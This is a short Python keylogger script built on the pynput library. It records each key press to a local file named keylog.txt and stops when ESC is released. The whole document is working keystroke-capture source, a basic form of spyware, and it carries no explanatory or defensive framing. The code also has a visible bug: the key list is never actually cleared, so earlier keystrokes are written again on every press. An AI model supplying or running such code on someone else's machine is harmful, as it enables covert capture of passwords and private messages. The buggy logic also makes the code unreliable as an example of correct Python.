from pynput.keyboard import Key, Listener

# File to store the logs
log_file = "keylog.txt"

# List to store logged keys temporarily
keys = []

# Function to handle each key press
def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)

# Function to write the keys to a file
def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            # Format the key for readability
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
        keys = []

# Function to stop logging on pressing ESC
def on_release(key):
    if key == Key.esc:
        return False

# Setting up the listener for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
